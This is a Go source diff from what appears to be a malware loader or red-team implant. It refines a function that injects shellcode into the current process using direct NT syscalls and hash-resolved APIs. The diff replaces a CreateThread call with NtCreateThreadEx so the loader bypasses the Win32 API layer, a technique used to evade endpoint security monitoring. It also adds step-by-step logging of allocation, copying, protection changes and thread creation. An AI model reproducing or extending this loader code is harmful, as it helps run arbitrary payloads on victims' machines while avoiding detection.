@@ -983,71 +983,26 @@ func (r *memoryReaderAt) ReadAt(p []byte, off int64) (n int, err error) {
 	return n, err
 }
 
-// CreateThreadDirect calls CreateThread from kernel32.dll directly using manual assembly call
-func CreateThreadDirect(startAddress uintptr, parameter uintptr) (uintptr, error) {
-	// Get kernel32.dll base address
-	kernel32Hash := obf.GetHash("kernel32.dll")
-	kernel32Base := syscallresolve.GetModuleBase(kernel32Hash)
-	if kernel32Base == 0 {
-		return 0, fmt.Errorf("failed to get kernel32.dll base address")
-	}
-	
-	// Get CreateThread function address
-	createThreadHash := obf.GetHash("CreateThread")
-	createThreadAddr := syscallresolve.GetFunctionAddress(kernel32Base, createThreadHash)
-	if createThreadAddr == 0 {
-		return 0, fmt.Errorf("failed to get CreateThread address")
-	}
-	
-	fmt.Printf("Found CreateThread at: 0x%X\n", createThreadAddr)
-	
-	// Call CreateThread directly using inline assembly approach
-	// CreateThread(NULL, 0, startAddress, parameter, 0, NULL)
-	var threadHandle uintptr
-	var threadId uintptr
-	
-	// Create a simple assembly call using the same pattern as syscalls
-	// We'll call the function address directly with the right parameters
-	result := callCreateThread(
-		createThreadAddr,
-		0,                                    // lpThreadAttributes (NULL)
-		0,                                    // dwStackSize (0 = default)
-		startAddress,                         // lpStartAddress
-		parameter,                            // lpParameter
-		0,                                    // dwCreationFlags (0 = run immediately)
-		uintptr(unsafe.Pointer(&threadId)),   // lpThreadId
-	)
-	
-	threadHandle = result
-	if threadHandle == 0 {
-		return 0, fmt.Errorf("CreateThread returned NULL handle")
-	}
-	
-	fmt.Printf("CreateThread successful - Handle: 0x%X, ThreadID: %d\n", threadHandle, threadId)
-	return threadHandle, nil
-}
+// Note: CreateThreadDirect and callCreateThread functions removed 
+// We now use NtCreateThreadEx for true direct syscall thread creation (was using createthread earlier because ntcreatethreadex was introducing segfaults but it works now :3)
+// This avoids any dependency on Win32 API layer
 
-// callCreateThread performs the actual call to CreateThread using assembly
-// This uses DirectCall to call the function at the given address
-func callCreateThread(funcAddr, arg1, arg2, arg3, arg4, arg5, arg6 uintptr) uintptr {
-	// Use DirectCall to call the function address with proper Windows x64 calling convention
-	result, _ := DirectCall(funcAddr, arg1, arg2, arg3, arg4, arg5, arg6)
-	return result
-}
-
-// NtInjectSelfShellcode injects shellcode into the current process using direct syscalls
+// NtInjectSelfShellcode injects shellcode into the current process using direct syscalls ONLY
 // This function follows the proven pattern: allocate RW -> copy -> change to RX -> create thread
+// Now using NtCreateThreadEx for true direct syscall thread creation
 func NtInjectSelfShellcode(payload []byte) error {
 	if len(payload) == 0 {
 		return fmt.Errorf("payload is empty")
 	}
 
+	fmt.Printf("Starting direct syscall self-injection of %d bytes...\n", len(payload))
 	currentProcess := ^uintptr(0) // Use pseudo-handle for current process
 
 	// Step 1: Allocate RW memory
 	var baseAddress uintptr
 	size := uintptr(len(payload))
 
+	fmt.Printf("Step 1: Allocating %d bytes of RW memory...\n", size)
 	status, err := NtAllocateVirtualMemory(
 		currentProcess,
 		&baseAddress,
@@ -1059,11 +1014,15 @@ func NtInjectSelfShellcode(payload []byte) error {
 	if err != nil || status != STATUS_SUCCESS {
 		return fmt.Errorf("memory allocation failed: %v %s", err, FormatNTStatus(status))
 	}
+	fmt.Printf("  Allocated memory at: 0x%X\n", baseAddress)
 
 	// Step 2: Copy shellcode
+	fmt.Printf("Step 2: Copying shellcode to allocated memory...\n")
 	copy((*[1 << 30]byte)(unsafe.Pointer(baseAddress))[:len(payload)], payload)
+	fmt.Printf("  Shellcode copied successfully\n")
 
 	// Step 3: Change protection to RX
+	fmt.Printf("Step 3: Changing memory protection to RX...\n")
 	var oldProtect uintptr
 	status, err = NtProtectVirtualMemory(
 		currentProcess,
@@ -1075,28 +1034,63 @@ func NtInjectSelfShellcode(payload []byte) error {
 	if err != nil || status != STATUS_SUCCESS {
 		return fmt.Errorf("protect failed: %v %s", err, FormatNTStatus(status))
 	}
+	fmt.Printf("  Memory protection changed from 0x%X to PAGE_EXECUTE_READ\n", oldProtect)
 
-	// Step 4: Create thread using CreateThread instead of NtCreateThreadEx
-	hThread, err := CreateThreadDirect(baseAddress, 0)
-	if err != nil {
-		return fmt.Errorf("CreateThread failed: %v", err)
+	// Step 4: Create thread using NtCreateThreadEx (true direct syscall)
+	fmt.Printf("Step 4: Creating thread using NtCreateThreadEx...\n")
+	var hThread uintptr
+	
+	// NtCreateThreadEx parameters:
+	// threadHandle, desiredAccess, objectAttributes, processHandle, startAddress, arg, 
+	// createFlags, zeroBits, stackSize, maximumStackSize, attributeList
+	status, err = NtCreateThreadEx(
+		&hThread,                    // threadHandle - pointer to receive handle
+		THREAD_ALL_ACCESS,           // desiredAccess - full access to thread
+		0,                           // objectAttributes - NULL for basic usage
+		currentProcess,              // processHandle - current process pseudo-handle
+		baseAddress,                 // startAddress - our shellcode address
+		0,                           // arg - no parameter to pass
+		0,                           // createFlags - 0 = run immediately, 1 = create suspended
+		0,                           // zeroBits - 0 for default
+		0,                           // stackSize - 0 for default
+		0,                           // maximumStackSize - 0 for default
+		0,                           // attributeList - NULL for basic usage
+	)
+	
+	if err != nil || status != STATUS_SUCCESS {
+		return fmt.Errorf("NtCreateThreadEx failed: %v %s", err, FormatNTStatus(status))
 	}
 
-	fmt.Printf("Self-injection thread created: 0x%X\n", hThread)
+	fmt.Printf("  Thread created successfully: 0x%X\n", hThread)
 	
-	// Wait for thread to complete execution and check exit code
-	fmt.Printf("Waiting for thread to complete...\n")
+	// Wait for thread to complete execution
+	fmt.Printf("Step 5: Waiting for thread to complete...\n")
 	
-	// Wait for the thread with a timeout (5 seconds)
-	timeout := uint64(5000 * 1000 * 10) // 5 seconds in 100ns units
-	_, err = NtWaitForSingleObject(hThread, false, &timeout)
+	// Wait for the thread with a timeout (10 seconds to be safe)
+	timeout := uint64(10000 * 1000 * 10) // 10 seconds in 100ns units
+	waitStatus, err := NtWaitForSingleObject(hThread, false, &timeout)
 	if err != nil {
-		return err
+		fmt.Printf("  Warning: Wait failed: %v\n", err)
+	} else {
+		fmt.Printf("  Thread wait completed with status: %s\n", FormatNTStatus(waitStatus))
 	}
 	
-	time.Sleep(2 * time.Second)
-	NtClose(hThread)
+	// Give it a moment and then clean up
+	time.Sleep(1 * time.Second)
+	
+	// Close the thread handle
+	closeStatus, err := NtClose(hThread)
+	if err != nil || closeStatus != STATUS_SUCCESS {
+		fmt.Printf("  Warning: Failed to close thread handle: %v %s\n", err, FormatNTStatus(closeStatus))
+	} else {
+		fmt.Printf("  Thread handle closed successfully\n")
+	}
+	
+	fmt.Printf("Direct syscall self-injection completed!\n")
 	return nil
 }
+
+
+
 
 
